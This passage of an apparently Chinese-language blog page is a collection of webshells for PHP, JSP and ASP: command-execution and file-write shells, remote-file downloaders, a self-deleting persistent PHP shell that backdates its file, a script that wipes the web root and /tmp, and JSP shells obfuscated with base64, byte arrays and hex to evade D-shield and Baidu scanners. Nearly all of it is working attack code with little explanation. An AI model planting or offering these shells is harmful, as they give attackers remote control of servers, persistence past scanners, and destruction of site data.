class="variable">$F</span>))&#123;<span class="variable">$P</span>=<span class="variable">$D</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$N</span>;<span class="variable">$T</span>=@date(<span class="string">&quot;Y-m-d H:i:s&quot;</span>,@filemtime(<span class="variable">$P</span>));@<span class="variable">$E</span>=substr(base_convert(@fileperms(<span class="variable">$P</span>),<span class="number">10</span>,<span class="number">8</span>),-<span class="number">4</span>);<span class="variable">$R</span>=<span class="string">&quot;\t&quot;</span>.<span class="variable">$T</span>.<span class="string">&quot;\t&quot;</span>.@filesize(<span class="variable">$P</span>).<span class="string">&quot;\t&quot;</span>.<span class="variable">$E</span>.<span class="string">&quot;\n&quot;</span>;<span class="keyword">if</span>(@is_dir(<span class="variable">$P</span>))<span class="variable">$M</span>.=<span class="variable">$N</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$R</span>;<span class="keyword">else</span> <span class="variable">$L</span>.=<span class="variable">$N</span>.<span class="variable">$R</span>;&#125;<span class="keyword">echo</span> <span class="variable">$M</span>.<span class="variable">$L</span>;@closedir(<span class="variable">$F</span>);&#125;;<span class="keyword">echo</span>(<span class="string">&quot;X@Y&quot;</span>);<span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><h4 id="å†™ğŸ"><a href="#å†™ğŸ" class="headerlink" title="å†™ğŸ"></a>å†™ğŸ</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @ini_set(<span class="string">&quot;display_errors&quot;</span>,<span class="string">&quot;0&quot;</span>);@set_time_limit(<span class="number">0</span>);<span class="keyword">if</span>(PHP_VERSION&lt;<span class="string">&#x27;5.3.0&#x27;</span>)&#123;@set_magic_quotes_runtime(<span class="number">0</span>);&#125;;<span class="keyword">echo</span>(<span class="string">&quot;X@Y&quot;</span>);<span class="variable">$f</span>=<span class="string">&#x27;/var/www/html/shell.php&#x27;</span>;<span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&quot;Du1&quot;</span>];<span class="variable">$c</span>=str_replace(<span class="string">&quot;\r&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$c</span>);<span class="variable">$c</span>=str_replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$c</span>);<span class="variable">$buf</span>=<span class="string">&quot;&quot;</span>;<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$c</span>);<span class="variable">$i</span>+=<span class="number">2</span>)<span class="variable">$buf</span>.=urldecode(<span class="string">&#x27;%&#x27;</span>.substr(<span class="variable">$c</span>,<span class="variable">$i</span>,<span class="number">2</span>));<span class="keyword">echo</span>(@fwrite(fopen(<span class="variable">$f</span>,<span class="string">&#x27;w&#x27;</span>),<span class="variable">$buf</span>)?<span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;0&#x27;</span>);;<span class="keyword">echo</span>(<span class="string">&quot;X@Y&quot;</span>);<span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><h3 id="å†…å­˜ä¸æ­»ğŸ"><a href="#å†…å­˜ä¸æ­»ğŸ" class="headerlink" title="å†…å­˜ä¸æ­»ğŸ"></a>å†…å­˜ä¸æ­»ğŸ</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line">unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;/var/www/html/.shell.php&#x27;</span>;</span><br><span class="line"><span class="comment">//$file = &#x27;D:\phpstudy_pro\WWW\h\.shell.php&#x27;;</span></span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;cdd7b7420654eb16c1e1b748d5b7c5b8&quot;)&#123;@eval($_POST[\&#x27;Du1\&#x27;]);&#125;?&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">file_put_contents(<span class="variable">$file</span>, <span class="variable">$code</span>);</span><br><span class="line">system(<span class="string">&#x27;touch -m -d &quot;2014-10-31 13:50:11&quot; .shell.php&#x27;</span>);</span><br><span class="line">usleep(<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="372a1b33f1178a24810b45076f907767"><a href="#372a1b33f1178a24810b45076f907767" class="headerlink" title="372a1b33f1178a24810b45076f907767"></a>372a1b33f1178a24810b45076f907767</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// çµ•ä¸–å¥½é¦¬</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">1. write .htaccess to prevent any execution from web</span></span><br><span class="line"><span class="comment">2. rm every thing in web dir (/tmp dir  and  /var/tmp dir)</span></span><br><span class="line"><span class="comment">3. link flag to web path</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//config</span></span><br><span class="line"><span class="variable">$web_path</span> = <span class="string">&quot;/var/www/html/&quot;</span>;</span><br><span class="line"><span class="variable">$hash_1</span> = <span class="string">&quot;93ca52b2614926880c319db1ac5b1380&quot;</span>;</span><br><span class="line"><span class="variable">$flag_link</span> = <span class="variable">$web_path</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$hash_1</span>.<span class="string">&quot;.png&quot;</span>;</span><br><span class="line"><span class="variable">$htaccess_file</span> = <span class="string">&#x27;.htaccess&#x27;</span>;</span><br><span class="line"><span class="variable">$flag_path</span> = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line"><span class="variable">$htaccess</span> = <span class="string">&#x27;&lt;FilesMatch &quot;.+\.ph(p[3457]?|t|tml)$&quot;&gt;</span></span><br><span class="line"><span class="string">Deny from all</span></span><br><span class="line"><span class="string">&lt;/FilesMatch&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">TRUE</span>) &#123;&#123;</span><br><span class="line">system(<span class="string">&#x27;rm -rf /var/tmp/.* /var/tmp/* /tmp/.* /tmp/*&#x27;</span>);</span><br><span class="line"><span class="variable">$files</span> = scandir(<span class="variable">$web_path</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="string">&#x27;rm -rf&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file</span> != <span class="string">&#x27;.&#x27;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&#x27;..&#x27;</span> &amp;&amp; <span class="variable">$file</span> != <span class="variable">$htaccess_file</span> &amp;&amp; <span class="variable">$file</span> != <span class="variable">$hash_1</span>.<span class="string">&quot;.png&quot;</span>)&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$res</span> . <span class="string">&#x27; &#x27;</span> .<span class="variable">$file</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">system(<span class="variable">$res</span>);</span><br><span class="line"><span class="keyword">if</span> (file_get_contents(<span class="variable">$htaccess_file</span>)!==<span class="variable">$htaccess</span>) &#123;&#123; </span><br><span class="line">    system(<span class="string">&#x27;chmod +w &#x27;</span>.<span class="variable">$htaccess_file</span>);</span><br><span class="line">    file_put_contents(<span class="variable">$htaccess_file</span>, <span class="variable">$htaccess</span>); </span><br><span class="line">    system(<span class="string">&#x27;chmod -w &#x27;</span>.<span class="variable">$htaccess_file</span>);</span><br><span class="line">&#125;&#125;</span><br><span class="line">system(<span class="string">&#x27;ln -s &#x27;</span>.<span class="variable">$flag_path</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$flag_link</span>);</span><br><span class="line">system(<span class="string">&#x27;chmod -w &#x27;</span>.<span class="variable">$flag_link</span>);</span><br><span class="line">usleep(<span class="number">5</span>);</span><br><span class="line">&#125;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h2><h3 id="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"><a href="#æ‰§è¡Œç³»ç»Ÿå‘½ä»¤" class="headerlink" title="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"></a>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</h3><h4 id="æ— å›æ˜¾æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"><a href="#æ— å›æ˜¾æ‰§è¡Œç³»ç»Ÿå‘½ä»¤" class="headerlink" title="æ— å›æ˜¾æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"></a>æ— å›æ˜¾æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;Du1&quot;</span>));%&gt;</span><br></pre></td></tr></table></figure><h4 id="æœ‰å›æ˜¾å¸¦å¯†ç éªŒè¯"><a href="#æœ‰å›æ˜¾å¸¦å¯†ç éªŒè¯" class="headerlink" title="æœ‰å›æ˜¾å¸¦å¯†ç éªŒè¯"></a>æœ‰å›æ˜¾å¸¦å¯†ç éªŒè¯</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;023&quot;</span>.equals(request.getParameter(<span class="string">&quot;passwd&quot;</span>)))&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;Du1&quot;</span>)).getInputStream();</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            out.println(<span class="keyword">new</span> String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="æŠŠå­—ç¬¦ä¸²ç¼–ç åå†™å…¥æŒ‡å®šæ–‡ä»¶"><a href="#æŠŠå­—ç¬¦ä¸²ç¼–ç åå†™å…¥æŒ‡å®šæ–‡ä»¶" class="headerlink" title="æŠŠå­—ç¬¦ä¸²ç¼–ç åå†™å…¥æŒ‡å®šæ–‡ä»¶"></a>æŠŠå­—ç¬¦ä¸²ç¼–ç åå†™å…¥æŒ‡å®šæ–‡ä»¶</h3><h4 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="keyword">new</span> java.io.FileOutputStream(request.getParameter(<span class="string">&quot;file&quot;</span>)).write(request.getParameter(<span class="string">&quot;str&quot;</span>).getBytes());%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%<span class="keyword">new</span> java.io.FileOutputStream(application.getRealPath(<span class="string">&quot;/&quot;</span>)+<span class="string">&quot;/&quot;</span>+request.getParameter(<span class="string">&quot;file&quot;</span>)).write(request.getParameter(<span class="string">&quot;str&quot;</span>).getBytes());%&gt;</span><br></pre></td></tr></table></figure><h4 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="keyword">new</span> java.io.RandomAccessFile(request.getParameter(<span class="string">&quot;file&quot;</span>),<span class="string">&quot;rw&quot;</span>).write(request.getParameter(<span class="string">&quot;str&quot;</span>).getBytes()); %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%<span class="keyword">new</span> java.io.RandomAccessFile(application.getRealPath(<span class="string">&quot;/&quot;</span>)+<span class="string">&quot;/&quot;</span>+request.getParameter(<span class="string">&quot;f&quot;</span>),<span class="string">&quot;rw&quot;</span>).write(request.getParameter(<span class="string">&quot;c&quot;</span>).getBytes()); %&gt;</span><br></pre></td></tr></table></figure><h3 id="ä¸‹è½½è¿œç¨‹æ–‡ä»¶"><a href="#ä¸‹è½½è¿œç¨‹æ–‡ä»¶" class="headerlink" title="ä¸‹è½½è¿œç¨‹æ–‡ä»¶"></a>ä¸‹è½½è¿œç¨‹æ–‡ä»¶</h3><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    java.io.InputStream in = <span class="keyword">new</span> java.net.URL(request.getParameter(<span class="string">&quot;url&quot;</span>)).openStream();</span><br><span class="line">    <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">    java.io.ByteArrayOutputStream baos = <span class="keyword">new</span> java.io.ByteArrayOutputStream();</span><br><span class="line">    <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">        baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">new</span> java.io.FileOutputStream(request.getParameter(<span class="string">&quot;file&quot;</span>)).write(baos.toByteArray());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>ç›´æ¥ä¸‹è½½åˆ° web è·¯å¾„ä¸‹ï¼š</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    java.io.InputStream in = <span class="keyword">new</span> java.net.URL(request.getParameter(<span class="string">&quot;u&quot;</span>)).openStream();</span><br><span class="line">    <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">    java.io.ByteArrayOutputStream baos = <span class="keyword">new</span> java.io.ByteArrayOutputStream();</span><br><span class="line">    <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">        baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">new</span> java.io.FileOutputStream(application.getRealPath(<span class="string">&quot;/&quot;</span>)+<span class="string">&quot;/&quot;</span>+ request.getParameter(<span class="string">&quot;f&quot;</span>)).write(baos.toByteArray());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="å…æ€-1"><a href="#å…æ€-1" class="headerlink" title="å…æ€"></a>å…æ€</h3><h4 id="å‘½ä»¤æ‰§è¡Œ-Jsp-bypass-Dç›¾-amp-ç™¾åº¦scanner"><a href="#å‘½ä»¤æ‰§è¡Œ-Jsp-bypass-Dç›¾-amp-ç™¾åº¦scanner" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ Jsp bypass Dç›¾ &amp; ç™¾åº¦scanner"></a>å‘½ä»¤æ‰§è¡Œ Jsp bypass Dç›¾ &amp; ç™¾åº¦scanner</h4><h5 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h5><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(request.getParameter(<span class="string">&quot;cmd&quot;</span>)!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        BASE64Decoder decoder = <span class="keyword">new</span> BASE64Decoder();</span><br><span class="line">        Class rt = Class.forName(<span class="keyword">new</span> String(decoder.decodeBuffer(<span class="string">&quot;amF2YS5sYW5nLlJ1bnRpbWU=&quot;</span>)));</span><br><span class="line">        Process e = (Process)</span><br><span class="line">                rt.getMethod(<span class="keyword">new</span> String(decoder.decodeBuffer(<span class="string">&quot;ZXhlYw==&quot;</span>)), String.class).invoke(rt.getMethod(<span class="keyword">new</span></span><br><span class="line">                        String(decoder.decodeBuffer(<span class="string">&quot;Z2V0UnVudGltZQ==&quot;</span>))).invoke(<span class="keyword">null</span>, <span class="keyword">new</span></span><br><span class="line">                        Object[]&#123;&#125;), request.getParameter(<span class="string">&quot;cmd&quot;</span>) );</span><br><span class="line">        java.io.InputStream in = e.getInputStream();</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            out.println(<span class="keyword">new</span> String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h5 id="ASCII"><a href="#ASCII" class="headerlink" title="ASCII"></a>ASCII</h5><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span>  language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(request.getParameter(<span class="string">&quot;cmd&quot;</span>)!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        Class rt = Class.forName(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[] &#123; <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">46</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">46</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span> &#125;));</span><br><span class="line">        Process e = (Process) rt.getMethod(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[] &#123; <span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">99</span> &#125;), String.class).invoke(rt.getMethod(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[] &#123; <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span> &#125;)).invoke(<span class="keyword">null</span>), request.getParameter(<span class="string">&quot;cmd&quot;</span>) );</span><br><span class="line">        java.io.InputStream in = e.getInputStream();</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;<span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123; out.println(<span class="keyword">new</span> String(b)); &#125;out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h5 id="HEX"><a href="#HEX" class="headerlink" title="HEX"></a>HEX</h5><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> <span class="keyword">import</span>=<span class="string">&quot;javax.xml.bind.DatatypeConverter&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(request.getParameter(<span class="string">&quot;cmd&quot;</span>)!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        Class rt = Class.forName(<span class="keyword">new</span> String(DatatypeConverter.parseHexBinary(<span class="string">&quot;6a6176612e6c616e672e52756e74696d65&quot;</span>)));</span><br><span class="line">        Process e = (Process) rt.getMethod(<span class="keyword">new</span> String(DatatypeConverter.parseHexBinary(<span class="string">&quot;65786563&quot;</span>)), String.class).invoke(rt.getMethod(<span class="keyword">new</span> String(DatatypeConverter.parseHexBinary(<span class="string">&quot;67657452756e74696d65&quot;</span>))).invoke(<span class="keyword">null</span>), request.getParameter(<span class="string">&quot;cmd&quot;</span>) );</span><br><span class="line">        java.io.InputStream in = e.getInputStream();</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;<span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123; out.println(<span class="keyword">new</span> String(b)); &#125;out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h4 id="å†°è-Jsp-bypass-Dç›¾-amp-ç™¾åº¦scanner"><a href="#å†°è-Jsp-bypass-Dç›¾-amp-ç™¾åº¦scanner" class="headerlink" title="å†°è Jsp bypass Dç›¾ &amp; ç™¾åº¦scanner"></a>å†°è Jsp bypass Dç›¾ &amp; ç™¾åº¦scanner</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span>%&gt;</span><br><span class="line">&lt;%!<span class="class"><span class="keyword">class</span> <span class="title">U</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;U(ClassLoader c)&#123;<span class="keyword">super</span>(c);&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> Class <span class="title">g</span><span class="params">(<span class="keyword">byte</span> []b)</span></span>&#123;<span class="keyword">return</span> <span class="keyword">super</span>.defineClass(b,<span class="number">0</span>,b.length);&#125;&#125;%&gt;</span><br><span class="line">&lt;%<span class="keyword">if</span>(request.getParameter(<span class="string">&quot;pass&quot;</span>)!=<span class="keyword">null</span>)&#123;String k=(<span class="string">&quot;&quot;</span>+UUID.randomUUID()).replace(<span class="string">&quot;-&quot;</span>,<span class="string">&quot;&quot;</span>).substring(<span class="number">16</span>);session.putValue(<span class="string">&quot;u&quot;</span>,k);</span><br><span class="line">out.print(k);<span class="keyword">return</span>;&#125;</span><br><span class="line">Cipher c=Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">SecretKeySpec sec=<span class="keyword">new</span> SecretKeySpec((session.getValue(<span class="string">&quot;u&quot;</span>)+<span class="string">&quot;&quot;</span>).getBytes(),<span class="string">&quot;AES&quot;</span>);</span><br><span class="line"> c.init(<span class="number">2</span>,sec);</span><br><span class="line"> String uploadString= request.getReader().readLine();</span><br><span class="line"><span class="keyword">new</span> U(<span class="keyword">this</span>.getClass().getClassLoader()).g(c.doFinal(<span class="keyword">new</span> sun.misc.BASE64Decoder().decodeBuffer(uploadString))).newInstance().equals(pageContext);%&gt;</span><br></pre></td></tr></table></figure><h3 id="åå°„è°ƒç”¨å¤–éƒ¨-Jar"><a href="#åå°„è°ƒç”¨å¤–éƒ¨-Jar" class="headerlink" title="åå°„è°ƒç”¨å¤–éƒ¨ Jar"></a>åå°„è°ƒç”¨å¤–éƒ¨ Jar</h3><p>ç›´æ¥ç”¨äº†æŸä½å¸ˆå‚…å®ç°äº†çš„è¿œç¨‹åŠ è½½ç±»ï¼Œæ”¹å¤©è‡ªå·±æ­ä¸€ä¸‹å§ã€‚</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=Class.forName(<span class="string">&quot;Load&quot;</span>,<span class="keyword">true</span>,<span class="keyword">new</span> java.net.URLClassLoader(<span class="keyword">new</span> java.net.URL[]&#123;<span class="keyword">new</span> java.net.URL(request.getParameter(<span class="string">&quot;u&quot;</span>))&#125;)).getMethods()[<span class="number">0</span>].invoke(<span class="keyword">null</span>, <span class="keyword">new</span> Object[]&#123;request.getParameterMap()&#125;)%&gt;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨æ–¹æ³•ï¼š<code>?u=http://javaweb.org/Cat.jar&amp;023=A</code></p><h3 id="å¤§ğŸ"><a href="#å¤§ğŸ" class="headerlink" title="å¤§ğŸ"></a>å¤§ğŸ</h3><p>å¤ªå¤§äº†ï¼Œä¸å¥½æ”¾ï¼Œä¸¢è‡ªå·±æœ¬åœ°äº†</p><h2 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h2><h3 id="ä¸€å¥è¯"><a href="#ä¸€å¥è¯" class="headerlink" title="ä¸€å¥è¯"></a>ä¸€å¥è¯</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%eval request(&quot;_&quot;)%&gt;</span><br><span class="line">&lt;%execute(request(&quot;Du1&quot;))%&gt;</span><br></pre></td></tr></table></figure><h3 id="ä¸€äº›ç®€å•Bypass"><a href="#ä¸€äº›ç®€å•Bypass" class="headerlink" title="ä¸€äº›ç®€å•Bypass"></a>ä¸€äº›ç®€å•Bypass</h3><figure class="highlight plain"><table><tr><td 